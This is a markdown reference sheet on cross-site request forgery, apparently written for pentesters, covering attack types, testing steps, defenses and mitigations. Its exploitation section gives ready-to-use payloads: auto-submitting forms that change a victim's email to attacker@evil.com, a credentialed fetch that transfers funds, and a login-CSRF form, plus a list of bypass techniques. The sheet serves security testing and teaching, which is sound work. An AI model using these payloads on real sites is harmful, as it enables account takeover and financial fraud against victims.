---
title: Cross-Site Request Forgery (CSRF)
---

# Cross-Site Request Forgery (CSRF)

## Description

CSRF is an attack that tricks an authenticated user's browser into sending a forged, state-changing request to a target application without their knowledge or consent. Because the browser automatically attaches session cookies to requests, the server can't distinguish a legitimate user action from a request silently triggered by a malicious page the victim happened to visit while logged in.

---

## Fundamentals — Types of CSRF Attacks

1. **Classic Form-Based CSRF (POST)**
    - Auto-submitting HTML forms hosted on an attacker page trigger state-changing POST requests using the victim's cookies.
2. **GET-Based CSRF**
    - State-changing actions mistakenly exposed via GET, exploitable with a single `<img>` or `<iframe>` tag — no user interaction needed beyond page load.
3. **JSON/API CSRF**
    - Exploits endpoints that accept `Content-Type: application/json` (or `text/plain` mislabeled as JSON) without token validation, often chained with CORS/content-type confusion.
4. **Login CSRF**
    - Forces a victim to log into the *attacker's* account on a target site, so subsequent actions (e.g., saved searches, uploaded data) are attributable to/captured by the attacker.
5. **CORS Misconfiguration + CSRF**
    - Combines a CORS misconfiguration (`Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true`) with CSRF to not just trigger an action but also **read the response**, turning CSRF into full account takeover territory.
6. **Click-Based / UI-Driven CSRF**
    - Requires a click (e.g., an auto-submit button disguised as something else) — often combined with clickjacking (`<iframe>` overlay) to mask intent.

---

### Requirements for Successful CSRF

A CSRF attack is generally possible only when all of the following conditions are met:

- The victim is authenticated to the target application.
- Authentication relies on automatically sent credentials (cookies, client certificates, NTLM, etc.).
- A state-changing action is performed without proper CSRF protection.
- The attacker can cause the victim's browser to send a crafted request.
- The application does not properly validate anti-CSRF tokens, Origin, or Referer headers.

---

## Attack Surface (Injection Points)

- State-changing actions without CSRF token:
    - Update email/password
    - Transfer funds
    - Delete account or change role
- Forms lacking CSRF tokens
- GET or POST requests with session cookies but no token
- JSON API endpoints using session cookies
- Admin actions, banking, or settings pages
- Misconfigured `SameSite` or CORS headers

### Testing Parameters

- Try submitting requests from another origin
- Remove or tamper with the CSRF token
- Replay request with `Origin` and `Referer` modified/absent
- Send requests with:
    - `Content-Type: application/json`
    - `text/plain`
    - `multipart/form-data`
- Attempt attack via:
    - `<img>`
    - `<iframe>`
    - `<script>`
    - Form with auto-submit
- Common Headers to Inspect
    - Origin
    - Referer
    - Cookie
    - Set-Cookie
    - SameSite
    - Access-Control-Allow-Origin
    - Access-Control-Allow-Credentials
    - X-CSRF-Token
    - X-Requested-With

---

## Exploitation and Bypassing Defenses

### 1. Basic GET CSRF

**Payload:**

```html
<img src="<https://target.com/delete_user?id=123>">
```

### 2. Auto-Submitting Form (POST)

**Payload:**

```html
<form action="<https://target.com/update_email>" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

### 3. JSON Body CSRF

**Conditions:**

- `Content-Type: application/json`
- Server accepts cookies for auth
- No CSRF protection in headers
- Depends on CORS misconfig + acceptance of "simple" content types

**Payload:**

```json
{
  "email": "attacker@evil.com"
}
```

**Headers:**

```
POST /api/profile/update HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: sessionid=abc123
```

### 4. CORS + CSRF Attack

**Exploit (in attacker's domain):**

```jsx
fetch("<https://target.com/api/transfer>", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ amount: 1000, to: "attacker" })
});
```

### 5. Login CSRF

Force the victim to authenticate into the attacker's account.

```html
<form action="<https://target.com/login>" method="POST">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="password" value="password123">
</form>
<script>document.forms[0].submit();</script>
```

If successful, subsequent actions performed by the victim are associated with the attacker's account.

### Other Vectors

- `<iframe src="<https://target.com/delete_account>">`
- `<script src="<https://target.com/delete_user?id=1>">`
- Use different `Content-Type` values to bypass validation:
    - `application/x-www-form-urlencoded`
    - `multipart/form-data`
    - `text/plain`

### Bypasses & Variations

- JSON CSRF (no CSRF token, uses cookies)
- Content-Type confusion bypass
- CORS misconfiguration + credentials
- Omit `Origin` or `Referer` headers (may bypass naive checks)
- Replay with removed/invalid/missing token
- **Token leakage via Referer:** if the CSRF token appears in a GET URL, it can leak to third parties via the `Referer` header.
- **Method override bypass:** using `X-HTTP-Method-Override` header to send a GET as a POST/PUT/DELETE where only GET is protected.
- **Flash/legacy no-CORS tricks:** older apps sometimes allow multipart form submission to bypass strict JSON-only parsers, re-enabling classic form-based CSRF on endpoints "protected" by content-type checks.
- SameSite bypasses (Lax+GET behavior, sibling subdomains, browser-specific behavior)

---

## Advance Attack Scenarios

- **CSRF Chained with Stored XSS:** Use a stored XSS to programmatically read the CSRF token from the DOM and include it in a forged request, defeating token-based protection entirely.
- **CSRF Token Fixation:** If the token isn't rotated after login or is set via a value the attacker can predict/plant (e.g., cookie-based double-submit without proper binding), the attacker pre-sets a known token and forges valid requests.
- **Double-Submit Cookie Bypass:** When the CSRF defense compares a cookie value to a request parameter without server-side session binding, an attacker who can set cookies on the victim's browser (via a subdomain XSS or cookie injection) can forge both sides.
- **CSRF via Clickjacking Overlay:** Wrap a legitimate-looking button in an invisible iframe pointing to the sensitive action, tricking the victim into "clicking" a hidden auto-submit trigger.
- **CSRF on Multi-Step Actions (Chained Requests):** When a "wizard"-style flow only protects the final step, forge just that last request while relying on the victim's already-established earlier session state.
- **Login CSRF Leading to Data Exfiltration:** Force login as attacker's account, then have the victim unknowingly upload/save sensitive data into the attacker-controlled account.
- **Client-Side CSRF (JavaScript CSRF):** Single Page Applications (SPAs) may unintentionally construct requests using attacker-controlled URL fragments, query parameters, or postMessage data. Even though the server validates CSRF tokens correctly, vulnerable client-side JavaScript can still trigger authenticated actions.

---

## Framework-Specific Scenarios

- **Django:** Missing `{% csrf_token %}` in a form, or `@csrf_exempt` left on a state-changing view by mistake; `CSRF_TRUSTED_ORIGINS` misconfigured to include wildcard/staging subdomains.
- **Spring (Spring Security):** CSRF protection disabled globally (`http.csrf().disable()`) for "API convenience," inadvertently exposing session-cookie-authenticated endpoints.
- **Ruby on Rails:** `protect_from_forgery` set to `:null_session` or skipped via `skip_before_action :verify_authenticity_token` on specific controllers handling sensitive actions.
- **Express.js (csurf/csrf-csrf middleware):** Token validation middleware mounted after route handlers, or excluded on JSON API routes under the assumption "APIs don't need CSRF protection" (false when cookie-based auth is used).
- [**ASP.NET](http://asp.net/):** `[ValidateAntiForgeryToken]` attribute missing on a POST action, or anti-forgery cookie not scoped correctly across subdomains.
- **Laravel:** Routes added to `VerifyCsrfToken`'s `$except` array for testing and never removed before production.

---

## Detection Techniques

### Manual Detection

- Inspect forms/requests for the presence and validation of a CSRF token.
- Strip or tamper with the token and resend — a `200 OK` or success response indicates no server-side validation.
- Change request `Content-Type` (JSON → form-urlencoded, etc.) and observe whether the action still succeeds without a token.
- Check whether `Origin`/`Referer` are validated by omitting or spoofing them.
- Build a standalone HTML PoC page and load it in a browser with an active victim session to confirm real-world exploitability end-to-end.

### API Testing Tips

- Check whether cookie-based API endpoints enforce CSRF protection.
- Test endpoints accepting both JSON and form-urlencoded bodies.
- Try removing custom CSRF headers.
- Test mobile/web API endpoints separately, as protections often differ.
- Verify whether bearer-token APIs are actually vulnerable (pure Authorization header-based APIs are generally not affected by CSRF).

### Automated Detection

- **Burp Suite:** Use the built-in "Generate CSRF PoC" feature on any request, plus Burp Scanner's CSRF checks.
- **OWASP ZAP:** Automated active scan rules flag missing/weak anti-CSRF tokens.
- Custom scripts to crawl state-changing endpoints and flag any accepting requests without a valid, session-bound token.

---

## Impact

- Perform unauthorized actions on behalf of authenticated users.
- Modify account information such as email addresses, passwords, or profile details.
- Transfer funds or abuse business logic in financial applications.
- Change security settings, including MFA, recovery email, or notification preferences.
- Perform privileged administrative actions if an administrator is targeted.
- Force victims to interact with attacker-controlled accounts through Login CSRF.
- Trigger sensitive operations such as account deletion, order placement, or subscription changes.
- Lead to account compromise, financial loss, unauthorized access, and business process abuse depending on the affected functionality.

---

## Common Anti-CSRF Defenses

Applications commonly defend against CSRF using one or more of the following:

- Synchronizer (stateful) CSRF tokens
- Double-submit cookie pattern
- SameSite cookie attribute
- Origin header validation
- Referer header validation
- Custom request headers (e.g., `X-CSRF-Token`, `X-Requested-With`)
- User interaction requirements (password confirmation, CAPTCHA, MFA)

---

## Mitigations

### Token-Based Protection

- Use **CSRF tokens** in forms and headers
- Bind token to session, rotate frequently
- Verify token on server-side for all state-changing requests

### Origin/Referer Validation

- Strictly check `Origin` and `Referer` headers
- Reject requests without expected values

### Secure Cookie Settings

- Use `SameSite=Lax` or `Strict` for session cookies
- Set `HttpOnly` and `Secure` flags

### Server-Side Hardening

- Never perform sensitive actions via GET
- Use POST or other non-simple methods
- Require re-authentication for critical actions

### CORS Configuration

- Do not allow wildcard origins () with credentials
- Use strict `Access-Control-Allow-Origin` per origin
- Disable `Access-Control-Allow-Credentials` unless absolutely needed

### Additional Defenses

- CAPTCHA or re-auth for critical flows
- Per-request nonce in headers for APIs
- OAuth/OIDC login flows should always validate the `state` parameter to prevent CSRF during authorization.

---

## Tools

- Burp Suite (Manual & CSRF PoC Generator)
- OWASP ZAP (Active Scan CSRF rules)
- OWASP CSRFTester
- Postman / curl for crafting test requests
- Web browser DevTools (modify request headers)

---

## Good To Read

**HackerOne / Real-World Reports**

- https://hackerone.com/reports/1626356
- https://hackerone.com/reports/2736979
- https://hackerone.com/reports/1727221

---

## References

[https://medium.com/@yadav-ajay/cross-site-request-forgery-csrf-64066cddbfb3](https://medium.com/@yadav-ajay/cross-site-request-forgery-csrf-64066cddbfb3)

[https://medium.com/@raia39499/a-deep-dive-into-logout-csrf-vulnerability-e40e1fa7f465](https://medium.com/@raia39499/a-deep-dive-into-logout-csrf-vulnerability-e40e1fa7f465)

[https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf)

[https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-request-forgery-csrf](https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-request-forgery-csrf)

[https://infosecwriteups.com/bug-bounty-hunting-web-vulnerability-cross-site-request-forgery-54aefdf60bf8](https://infosecwriteups.com/bug-bounty-hunting-web-vulnerability-cross-site-request-forgery-54aefdf60bf8)

[https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery)

[https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/CSRF.md](https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/CSRF.md)

[https://bugbase.ai/blog/how-to-bypass-csrf-protection](https://bugbase.ai/blog/how-to-bypass-csrf-protection)

[https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)

---

*(Mindmap: To be included later)*